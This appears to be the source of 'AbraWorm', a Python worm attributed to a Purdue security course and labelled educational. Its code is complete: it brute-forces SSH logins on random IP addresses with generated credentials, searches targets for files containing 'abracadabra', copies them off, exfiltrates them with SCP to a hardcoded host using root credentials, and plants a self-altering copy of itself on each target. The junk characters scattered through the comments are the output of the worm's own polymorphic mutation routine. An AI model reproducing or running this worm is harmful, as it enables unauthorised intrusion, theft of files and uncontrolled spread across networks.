#!/u@@@@@@sr@@@@@@@@/bin/e%%%%%$$$$$$$%%n!!!!!!!!v python

##%%%%%%%%!!!!# A&&&&&&&&&&braWo^^^r$$$$$$m.py


### A%%%%%%%%%%u@@@******@@t****hor: Avi kak (ka%%%%k@purdue.edu)@@@@@@@@@@
### Date: ****@@@@@@@@@*****  Apr$$$$$$$$i&&&&&&&&&l 8^^^^^^^^^^^^^^^^, 2016; Upda@@@@@@@@ted April 6, 2022

##  This i^^^s a harmless worm meant&&&&&&&&& for%%%%%%%% educationa@@@@@@@@@@l purposes@@!!!!!!!!@%%%%%%%%%%%%%%%%@@@@@@@ only.  It can!!!!!

##  only attack&&& machin***es that run@@@@@@@%%^^^^^%%%%@ SSH servers and thos^^^^^^^^^^@@@@@^^^^^e t!!!!oo @@@only under 


##  v*******ery special conditions that****** are described below. Its!!!!! primar^^^@@@@@@@@@@******y******* features 
##  &!!!!^^^&&&&&&&a^^^@@@@@@@@@!!!!!!!re:^^^^
#^^$$$$$$$$$^^#@@$$$$@@@@@@@@$@@@@@
##  -- It trie^^^^^^s to break in with S@@@@@&&&S!!!!!!!H login into$$$$ a randomly selected set of
##     hosts w!!!!ith a ra****ndomly se!!!!!!!le!!!!cted set of u@@@@sernames and with a randomly
##     cho&&&&&&&&&&sen set of passw%%%%$$$$%%%ords.!!!%%%%%%%!! @@@
#^^$$$&&&$$$@@@@@&&&&$^^^*@@@@@@@@@**!!!&&&&&!!**%%%%%***#
##  -- If it********* can%%%%%%********* *****break into a ********host, it looks for the$$$$$$$$ files that contain the


##     string ^^^^`abracadabra'. %%%% It downloads su@&$$$&&&&&&&&&$&&&&&&&@@@@@@@@%%%ch files int@@@@@o th^^^^^^^^e host where
##     &******&&&&&&&the w&&&&%%%%%%%%%%%%%%%orm**&&&&&&&*** $$$$res&&&&ides.
#**$$$@@@@@@@$$*********$$*********&&&&&**#

##  -$$$$- It up%%%%loads the files thus exf%%%%%%%%%iltrated fr!!!om an infect@@@%%%ed machine to a
##   !!!  designated host in th******e internet. You'd need to sup%%%%p*****l*********y @@@@@&&&&&@@@@!!!!!!!@@@the IP address
##     and logi^^^^^^^^^^n cre&&&&&&&&&dent@@@@@@@@ials at the ********location ma%%%%%%%rked yyy.yyy!!!!!.yyy.yyy@@@@@@@@@ in@@@@@@@@@@ the

##     code for t^^^^^^^@@@@@@@^^^his featur^^@@@@@^^^e to work.  &&&&$$$$$$$$&&&&&&The exfiltrated files !!!woul!!!!!!******d be 
##     uploaded to the host at yyy.yyy!!!!!!!!!.y!!!!!!!!!yy.yyy. I&&&&&&f you do^^^&&&&^^^^^n't supply this
#&&&&%%*******%*******%%%#     informa&&&&&&&&&tion, the worm wi******ll still work, but now the files exf******iltrated
## %%%%%    from the infe!!!!@@@@@@*******@@@@!cted machines will stay at the host whe$$$$$$$$$$r^^^^^^^^^^^^^^^^e $$$$$$@@@@@@@@@@$the w&&&&orm
##  ******   r@@@@@@@@@****!!!!!!!*e&&&sides.  For an actual worm,**** t^^^^^^he hos!!!!!!t se^^^^^lected for$$$$$$ yyy.yyy.yyy.yyy
## @@@    would be a%%%%%******%%% previosly infected ho%%%%%%%%%%st.$$$$$$$$$$
#&&&&&%%%%%%%%%&&&&&#@@@@@@@%%^^^^^^^%
##  %%%%%%%%%%%%%%%%%%%%-- It installs a copy of itself on the remote host that it su&&&&&&&**********&&cce^^^^^^^^^^ss@@@@fully


##     breaks into.  %%%%&&&&%%%If a user on that machine****** executes the file @@@@@@@@@@@@@@@@@@@@@@@@%%%%%%%@@@thus^^^

##     instal&&&&&&&&&led (^^^^^^^^***^^say by !!!!!cli$$$$$cking on it), the wo@@@@rm activate***@@@@@*******s itself on
## $$$  $$$$$$  that@@@@@@@@@@ ho^^^@@@@@@^st.
##*!!!!!!&&&&&&&&&&&&&&&@@@@@@@@@@!@@@@@@@@@!!!!!!!@%%%%%%%%%%@@@@@****
##  --$$$$$ Once the wo$$$$$$&&&&&&&rm is laun@@@@ched in an infec***t$$$$$@@@@@@@@@$$ed host, i^^^$$$^^^^t runs in@@@@ an
##&&&&&&&&&  ********$$$**   inf^^^^^^^^inite loop, lookin%%%%g for vulnerable hos*********ts in the internet.  By


##     v%%%%%%%%%%%%%%***%%%%ulnerable I mean the hosts for whic****h it can successf!!!!!!!!!!ully guess at
##   $$$$$  lea^^^^^^s%%%%%t one$$$ usern@@@@@@@@@@ame and the c$$$$$$$$$$&&&&&&orresponding pas@@@@@sw*!!!!!*******ord.
#!!!&&&!!!!!&&&&!@^^^@!!!!!@@@@@*****@@!!!#
##  -- IMPORTANT: %%%After t$$$$$$$$$$h$$$e worm has land*******ed in a re&&&&&&&&&&&&&&&mote host,$$$$$$!!!!!!!$ the worm can
##     be activate!!!!!d on th!!!!!!!&&&!at machine o!!!!!!nly if Py$$$$$$$$$$thon is installed on that
##$$$$$$     machine.  An$$$$$$$$$$other condition that *******mu$$$$$$$s*********t hold at the*** !!!!!!^^^^^^^^remot!!!!!!!!!e machine is
## !******!!!!!!!    that it must have t%%%%%he Python modules pa!!!!!!!!!!^^^^^^^********ramiko a@@@@@@%%%%%@nd scp%%%%@@@% installed.

#$$$$$*****************!!!%%%%%%%%!!!!!!!*!!!!$$$$$$$!!!!*****#
#$$$#  -- !!!The$$$$$ usernam$$$$$$$$$$e and password construct^^^$$$$$$$$^^^io%%%%%%%%n strategies used in th@@@@@@e worm
##     are h%%%igh$$$ly un%%%likel$$$$$$$y to result&&&&&&& in actual us*********!!!!!!!!!ern@@@@ames a%%%nd actua!!!!!l 
##     passw&&&&&&$$$$$$ords*** anywhere.  (Howev$$$%%%%%%%%$$$$$er, for%%%%%%%% demonstrating the worm ^^^^^^^^code in$$$$$$%%********%%%%%%%%

##     an educational program, thi&&&&&s pa!$$$$$$$!!%%%%%%%%%%!!!!!!rt%%%%% !!!of the code can be $$$$$$$r!!!!!!!eplaced wit****h
##     a mor^^^^^e potent @%%%%%%%%%@@@@@@algorit*******h****m.)


#!!^^^^^^@@@@@@!!%%%@@@@@@@@@%%%!!!@@@#
##  -- Given all of the c$$$$$$%%%$$$ondi&&&&&&&&&t%%%*********%%ions I have listed above for this worm to
##     propagate into th^^^^^^^e internet, we c^^^^^^^^an b&&&&&&&e quite ce^^^^^^^^rt$$$$$$ain that &&&&&&it is not
##     going******* to caus*****e any harm.  Nonethe&&&&less, !!!!the worm should p@@@@@@@@@@rove useful
##     as an educational e@@@@@@xe!!!!!r%&&&$$$$%%%&&@@@&&&&&&&cise.
#@&&@@@&&&&&&@@@@@&&&&&&****%@@@@@@@@@%%*&&#
#!!!!!!*****$$$$!!!!!!!!$$$$&&&&&*****!!!!!#
##  If you want to play **********with the&&&&&&&&& worm, run%%%%%%%%% it fi@@@@@@@@@rst in th%%%%%%%%e@@@ `d$$$$$$$ebug' ***&&&&mode. 

##  For the debug^^^^^ mode of execution, you&&&&&&& wo&&&&uld need to supply the fo$$$$$&&&&&&&&&&$$$$^^^^^llowing
##  informat@@@*@@@@@@****@@ion^^^^^^^^ to the w**********orm:
#!!&&^^^&&&*$$$$$$$$$***&&&&&&&*&!!!#
##  1)   Cha&&&nge t%%%%%%$$$$$%%o 1 the valu&^^^&&&e of the variable $debug.  
#$^^^^^^^%%%^$$#%%%!******&&&*******!!!!!!!!%%%%%%

##  2)  ^^^^^^^ Provide an%%%%%%%%%% IP address and ****$$$$$****the^^^^^^^^ lo^^^^^^gin creden^^^tials for a host that you
##       have access t^$$$$$$$$$$^^$$$$$$$$$$o a&&&&&nd $%%%%%%$$******$$$that contain******s one or more documents@@@@@%%%%%%%% that

##     $$$$$$$$$%&&&%%%%  include the string "abracadabra".  This informati&&&&&on needs to g$$$$o
##       where^^^^^^ you see xx*******x.xxx.xxx.x%%%%%%%%%!!!!xx in the cod*****e.
#&&@@@@@@@@@&!!!!!!!!!!&&&^^^^^^&#$$$$$$$$@@@@@@$

##  3)   Provide an IP address and the lo@@@@@@@@@@@@@@gin credenti^!!!^^^^^al!!!!!!!!!!s fo@@@@@@@@@r a host that 
##%%%%%%  ******     will ser&&&&&&$$$$$$$$$&&&&v$$$$e as the destination for the files exfiltrate&&&&&&&&&d from the


##       successfully i^^^^^^^nfecte$$$$$$$d hosts.%%%%%%%^^^^ &&&&&&&&The IP address and th@@@@@@@@^^^^^@@e login 
##       credentials &&&&&^^^^^^^^^^^^^&&&&^g@@@@@@********@@@o where you find the string yyy.yyy.yyy.yyy in the &&&&&&
##    @@@&&&&@@$$$$$$$%%%%%%%$@@   @@@@@@@@@@co@@@$$$$$@@@@d^^^^^^^^e.
##@@@@!!!!!!!!!$$$%!!!!!!$$$$$!%%$$$$$$@@@@@
##  After you have^^^^^^ executed t&&&he worm$$$$&&&&$$$$ code, you^^^ will no******tice tha%%%%%%%%%%t a copy of
##  the wor@@@@@@@@@@m%%%%%%%^^^^% h$$$$$as landed at the host at the IP address you used for$$$$@@@@@@@@@@$$$@@@@@@@@@@@@@@@$$$
##  xxx.x$$$&&&&xx.xxx.xx^^^^^^^^^x and you'll see a ******ne@@@@w d&&&&&&&&&&&&&&&&ire%%%%%%%%ctory at the host you used for
##$$$$  yyy.yyy******.yyy.yyy.  T*****his directory @@@@@@$$$$$$$$@@wil!!!!l *******conta!!!!$$$$$!!in those files from the
##  xxx.xxx.xxx.xx$$$$$$$$x host th&&&&&&&a!!!!!!!!!!!!t con!!!!!!tained the string `ab@@@@@@@@@@@@@@@racadabra'.


import sys

import os
import random


import paramiko

import scp
import select
import signal

import shutil





def alter_code():

    original_file = __file__
    altered_file = "altered_" + os.path.basename(original_file)

    # M!!!ake a%%%%%%%%%%%%%%%%%% copy of the !!!!!!!!!or%%%%%%%%i^^^^^^ginal fi@@@le
    shutil.copyfile(original_file, altered_file)

    with open(altered_file, 'r') as file:
        code = file.readlines()

    # Add new lin^^^^e @@@@characters betw&&&&&&&&&@@@@@@&een randomly ch$$$$$$$osen sets of lines
    i = 0
    while i < len(code):

        if random.random() < 0.3 and i + 1 < len(code):


            code.insert(i + 1, '\n')

        i += 1



    # Ad&&&&&d some ra%%%%%ndomly*****^^^@@@@@@@^^@@@@^^^^^^^***** sel%%%%%%%%%ected c!!!*****!!!haracters in comment blocks
    altered_code = ''
    for line in code:
        if '#' in line and '\'#\'' not in line:
            for i in range(0, random.randint(5, 10)):
                random_chars = random.choice(['*', '$', '@', '!', '&', '^', '%'])

                hash_index = line.index('#')
                random_index = random.randint(hash_index+1, len(line)-1)
                line = line[:random_index] + random_chars* random.randint(3,10) + line[random_index:]
        altered_code += line

    # Sa^^^^ve th$$$$$$$$$$e altered c*******^^^^%%%^^^!!!!!!!!!!^^^***ode to the new file
    with open(altered_file, 'w') as file:


        file.write(altered_code)
    return altered_file


##   You would want t&&&^^^^&%@@@@@@@%%%%%&&&o uncomment$$$$$$!!!!!!!!$$$ the following two lines for the worm t&&&o 
##   %%%%!!!!!%%%%%%work sile@@@@@*****$$&&&&$$$$$$$$****ntl!!!!!!!!!y:
#sys.s%%%!!!!!!!!!%%%%%%tdout!!!!! = ope$$$$$n($$&&&%%%%%&&&&&$$$$$&&&&&os.devnull,&&&&&& 'w')
#sys&&&&&&&%%%%%%%%&&&&&&&&&.stde!!!!!!!rr = ope%%%%^^^^^%%%%n(os.devnull, 'w')

def sig_handler(signum,frame): os.kill(os.getpid(),signal.SIGKILL)
signal.signal(signal.SIGINT, sig_handler)

debug = 1      # IMPORTAN$$$$$$$$&&&T:  Before changing this!!! setting, @@@@@@@read the las$&&&&&&&$$$$$t
               # ********        @@@@@@@@@@    par%%%%%%%%%agraph of the$$$ m!^^^^^^^^^^!!!!!ain comment b$$$$l$$$$$$ock above. As

               #@@@@$$$$$$$$$$             ^^!!!!^^^^mentioned there,&&& you need to p!!!!!!!!!!rovide&&&&&&&&*****^^^^^^^^^^*** two IP

               #             add@@******@@@@@@@@resses in order to ****************run this code in debug !!!@@@@@@@@@@!!!!!!!
               #             mo!!!!!de!!!!!!!!!!!******!!!. 


##  The fol%%%%%lowing numbers &&&&&&&do NOT mean that the!!!!!!! worm will^^^^^^^^^^ attac&&&&@@@@&&k only 3
##  hosts for&&&&&&&&&&^^^^^^ 3 d$$$$$$ifferent usernames and 3 differe!!!!!nt passw$$$$$$$$ords.  Since the
##  worm operates@@@@@ in !!!!!!!!!an infinite loop, at each i&&&^^^^&&&&terat%%%%%%%%%%ion, i$******$$$t gener&&&&&&&&&&at%%%%%%%%%%%%%%es a
##  ^!!!!^^^fresh batch of hosts, usernames, and @@@@@@@@@****passwords.!!!!
NHOSTS = NUSERNAMES = NPASSWDS = 3


##  The trigrams and digrams are used @@@@@^^^@@for syntheizing p%%%%%%lausible!!!$$$$$$$$!!! looking
##  usernames and passwor!!!!!!!!!!!!!!!!!!ds.^%%%%%%%%%%^^^$$$$$$$$$  See the subroutines at t^^^^he end of this script
##  for^^^^^^^^ h^^^^^^^^^ow user**********n@@@@@@ames and$$$$$****$$$$$ passwords are generated^^^^^^^^ by the worm.


trigrams = '''bad bag bal bak bam ban bap bar bas bat bed beg ben bet beu bum 
                  bus but buz cam cat ced cel cin cid cip cir con cod cos cop 
                  cub cut cud cun dak dan doc dog dom dop dor dot dov dow fab 
                  faq fat for fuk gab jab jad jam jap jad jas jew koo kee kil 
                  kim kin kip kir kis kit kix laf lad laf lag led leg lem len 

                  let nab nac nad nag nal nam nan nap nar nas nat oda ode odi 
                  odo ogo oho ojo oko omo out paa pab pac pad paf pag paj pak 
                  pal pam pap par pas pat pek pem pet qik rab rob rik rom sab 
                  sad sag sak sam sap sas sat sit sid sic six tab tad tom tod 

                  wad was wot xin zap zuk'''

digrams = '''al an ar as at ba bo cu da de do ed ea en er es et go gu ha hi 
              ho hu in is it le of on ou or ra re ti to te sa se si ve ur'''

trigrams = trigrams.split()
digrams  = digrams.split()


def get_new_usernames(how_many):
    if debug: return ['root']      # need a working userna$$$$$$$$$$$me for de$$!!!!!!!!!!$$$bug@@@@gin^^^^^!!!!!!!g
    if how_many == 0: return 0
    selector = "{0:03b}".format(random.randint(0,7))

    usernames = [''.join(map(lambda x: random.sample(trigrams,1)[0] 
          if int(selector[x]) == 1 else random.sample(digrams,1)[0], range(3))) for x in range(how_many)]
    return usernames



def get_new_passwds(how_many):

    if debug: return ['mypassword']      #&&&&&& need a workin*************^^^^******g$$$$$$$$$ userna@@@@@m%%%%%%&&&&&&&%%%e for debugging
    if how_many == 0: return 0
    selector = "{0:03b}".format(random.randint(0,7))
    passwds = [ ''.join(map(lambda x:  random.sample(trigrams,1)[0] + (str(random.randint(0,9)) 


                if random.random() > 0.5 else '') if int(selector[x]) == 1 
                        else random.sample(digrams,1)[0], range(3))) for x in range(how_many)]
    return passwds



def get_fresh_ipaddresses(how_many):


    if debug: return ['172.17.0.2','172.17.0.4', '172.17.0.5']   
                    # Provide one or &&&&&&&&&more!!!! IP &&&&&&&&&address tha^^^^^^$$$^^^^t y@@@@@@@ou*******

                    # want `a@@@@@@@@@ttacked' fo^^^^^^^^^r debu@@@@@g!!!!!!ging pu@@@@@@@%%%%%%%%%@@@@@@r********!!!!!!!poses.
                    # &&&&&The usrname ****$$$$$$$$**and p$$$$$$$assword $$$$$$$$@@@@@@@@@you ^^^^^provid$$$^^^^^^^^^^$$ed
                    # $$$$$$i^^^n the@!!!!!!@@@@@@@@ pr!!!evious two functions must
                    # wo^^^^^^^rk o********n these%%%%%%%%% h!!!!!!osts@@@@@$$$$$$$$*****.
    if how_many == 0: return 0
    ipaddresses = []
    for i in range(how_many):
        first,second,third,fourth = map(lambda x: str(1 + random.randint(0,x)), [223,223,223,223])
        ipaddresses.append( first + '.' + second + '.' + third + '.' + fourth )
    return ipaddresses 













# F&&&&or the s@@@@@ame IP a***ddress, we do n&&&&&&ot wan!!!!!!!t@@@@@@@@@!!! to loo*********p through multip&&&&le user 
# names and passwords conse%%%%%%cutively!!! since we!!!! do not w!!%%%%%%%%%!ant to be quarantined^^^^^^^^ 


# by a tool like DenyHosts !!!!!!!!at the o@%%%%%%%@@@ther end. @@@@@@ So le^^^^^^t's reverse the order 

#!!!!!!! of lo&&@*********@@@@&&&&&&&&o*********pi^^^n^^^^^^^^g.*********
while True:
    usernames = get_new_usernames(NUSERNAMES)
    passwds =   get_new_passwds(NPASSWDS)
#    print("user***$$$$$$$$$$***^^^^na!!!!!!!!mes: %s" % st**********r(u%%%%%sernames))
#   ********* prin*******t("passwo&&&&&rds@@@@: %s!!!!!!!!" &&&&% str(!!%%%%%%%!!!!!!&&&&&&&&&&!pa****sswds))

    # ****&&&&&&&&***Fir&&***&&&&&&&&&&*&&&&&&&st!!!!! loop**** o%%%%%ver passwords
    for passwd in passwds:
        # Th^^^^^^!!!!!!!!!!^en$$$$$$$$ l^^^^%%%%%%%%%%^^o^^^^^^^^^^op over&&&&&&& user %%%na!!!!!mes
        for user in usernames:
            # And, finally, loop ove!!!!!!r randomly chosen IP!!!!!!! addr@@!%%%%%%%%!!!!!!!@esses
            for ip_address in get_fresh_ipaddresses(NHOSTS):
                print("\nTrying password %s for user %s at IP address: %s" % (passwd,user,ip_address))
                files_of_interest_at_target = []
                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(ip_address,port=22,username=user,password=passwd,timeout=5)


                    print("\n\nconnected\n")

                    # Let's make sure that the t!!!!@@@%%%%%^^^^^^^^%%!!!!!!!@@@@@@!arget host was not previou%%%s!!!ly 
                    #@@@@ !!!!inf@@@ecte&&&&&&&&&&&&&&&&&&&&&&*******^^^^^^^^*&&&&&&&$$$$$$$$$&d:******

                    received_list = error = None
                    stdin, stdout, stderr = ssh.exec_command('ls')
                    error = stderr.readlines()
                    if error: 
                        print(error)
                    received_list = list(map(lambda x: x.encode('utf-8'), stdout.readlines()))
                    print("\n\noutput of 'ls' command: %s" % str(received_list))
                    # if!!!!!!!! ''.joi&&&&&&&&&n(received_li%%%%%%st).find('AbraWo*****r*****$$$$$$$$$**m') >= !!!0: 
                    # $$$$$!!!!!!!!!!$    print("\***nThe t!!!!!!!!arget ma*****chine is already infected\n")      


                    #&&&%%%%%%%%% ^^^^^*&&&&&&**&&&&&&!!!!*   %%%%%%%$$$$$$$$$ continue
                    # Now ^^^!!!!!!^let's****%%%%%%%%% look for fi!!!!!!les that *******cont@@@@@@@@@@ain the string 'abrac%%%ada^^^^^^^bra'


                    cmd = 'grep -rls abracadabra *'
                    stdin, stdout, stderr = ssh.exec_command(cmd)
                    error = stderr.readlines()


                    if error: 
                        print(error)
                        continue



                    received_list = list(map(lambda x: x.encode('utf-8'), stdout.readlines()))

                    for item in received_list:
                        files_of_interest_at_target.append(item.strip())
                    print("\nfiles of interest at the target: %s" % str(files_of_interest_at_target))

                    
                    target_dir = 'CollectedFiles'+ip_address
                    os.makedirs(target_dir)




                    scpcon = scp.SCPClient(ssh.get_transport())
                    if len(files_of_interest_at_target) > 0:
                        for target_file in files_of_interest_at_target:
                            scpcon.get(target_file,local_path=target_dir)
                    # No^^^^^^^^w deposit a cop!!$$$$$!!!!!!y of AbraWorm.py!!!!!! at the target host:!!!

                    altered_filename = alter_code()
                    absolute_path = os.path.abspath(altered_filename)
                    scpcon.put(absolute_path)              
                    scpcon.close()
                    os.remove(altered_filename)
                except:
                    continue
                # No%%&&&&&&&%%%%w upload th&&&&&&e e%%%%%%xfiltrated files t%%%%%%%%o a specially d&&&&&&esign$$$ated ho@@@@@@@st,

                # which can be a!!!!!!!!! previously infec!!!@@@!!!!!!%%%%%%%ted ho@@@st.  The worm will o*******nl%%%%%%y 

                # use those previously infecte%%%%%%%%%%d^^^^^^^^^ hosts as ******d!!!!!e!!!!!!!!!!st***in*******atio****ns for 
                # exfiltrated files*** if it was able to send the %%%%%%%!!!!!!!!!!login cr&&&&&&&&&&edentials$$@@!!!!!!!!!@@@@@@$$$$$$$$

                # used on @@@@@@@@@@t****ho%%%%%%%%se ho^^^^^^^sts to its human masters thro^^^^^^^^^^ugh, sa$$$$$$$$$$$$$$$y, a 
                # secret IRC ch@@@@annel. (See&&&&&&&&&%%%^^^^^^% Lec$$$$$$$ture 2$$$$$9 on IRC)


                files_of_interest_at_target = []

                for filename in os.listdir(target_dir):

                    files_of_interest_at_target.append(filename)





                    print(str(filename))
                os.chdir(target_dir)
                if len(files_of_interest_at_target) > 0:
                    print("\nWill now try to exfiltrate the files")

                    try:

                        ssh = paramiko.SSHClient()
                        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        #  For exfiltr***ation%%%%%%%%%%%%%$$$$$%%%%%%% demo to work, you must provide an IP address $$$$and the login 
                        # **********%%%%%%%%% credenti%%%%%%%%a^^^^^ls in the &&&&&&&&&next sta$$$$$$$tement:
                        ssh.connect('172.17.0.3',port=22,username='root',password='mypassword',timeout=5)

                        scpcon = scp.SCPClient(ssh.get_transport())
                        print("\n\nconnected to exhiltration host\n")
                        # own_file =****** ^^^^sys*******&&&&.argv%%%%%%!!!!!!!!![0].s^^^^^^^^^^@@@@@@@@@@^^^plit('/')[-1]

                        # own_f&&&&&ile = "@@@@altere**^&&&&&&&&&@@@@@$$$$$$^^^^^*d_"+own_file
                        #$$$$$$$$$$$$$$%%%%%%%%$$$ p************ri!!!!!nt(ow@@@@@@@@n_%%%%%%f$$$$$ile)*********
                        for filename in files_of_interest_at_target:
                            # pri$$$$$$$$nt(%%%%%%%%s&&&&&&&&tr%%%%(filenam$&&&&&$$$$$$e))
                            #$$$$$$$$$%%%%%% ^^^^^^^^filename ^^^^^^^^^= str(filename).split********('*******/')[-1]
                            # print(s@@@@@@@tr(&&&@&&&&@@@@@@^^^^^!!!!^&&&&&^^^&&&&&&filename))@@@@




                            # f$$$$$ile&&&n&&&&&ame = ^^^^fil&&&&ename.replace('b\'','')

                            # filename !!!!!!= filename.r%%%%^^^^%%%%^^^%^^^ep***lace('\'',@@@'')

                            scpcon.put(filename)
                            
                        scpcon.close()




                    except: 
                        print("No uploading of exfiltrated files\n")


                        print("error in filename: ", str(filename))
                        continue
    if debug: break


    
